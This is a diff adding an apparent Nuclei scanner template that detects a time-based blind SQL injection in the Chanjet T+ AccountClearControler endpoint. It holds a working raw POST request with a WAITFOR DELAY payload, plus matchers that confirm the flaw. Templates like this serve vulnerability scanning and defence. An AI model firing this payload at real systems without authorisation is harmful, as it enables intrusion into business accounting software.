@@ -1,0 +1,37 @@
+id: chanjet-tplus-AccountClearControler-sqli
+
+info:
+  name: 畅捷通T+ AccountClearControler SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    畅捷通T+软件AccountClearControler接口存在SQL注入漏洞，攻击者可利用此漏洞执行任意SQL命令
+    [漏洞发现时间：2025年7月]
+  reference:
+    - https://www.chanjet.com
+  tags: 畅捷通-TPlus
+
+http:
+  - raw:
+    - |-
+      @timeout: 30s
+      POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+      Content-Length: 45
+
+      {"accNum": "3' WAITFOR DELAY '0:0:3'-- QoLY"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+      - type: word
+        words:
+          - "value"
+          - "false"
+        part: body
+        condition: and
